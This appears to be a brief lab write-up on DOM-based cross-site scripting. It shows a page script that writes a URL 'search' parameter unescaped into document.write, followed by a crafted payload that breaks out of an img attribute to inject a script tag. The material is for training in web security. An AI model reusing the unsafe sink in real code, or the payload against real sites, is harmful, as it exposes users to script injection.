#### Step 1 - Identify sink
```
<script>
function trackSearch(query) {
	document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');}
	
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
   trackSearch(query);
}
</script>
```

#### Step 2 - Craft exploit

```'"><script>alert(1)</script>);//```
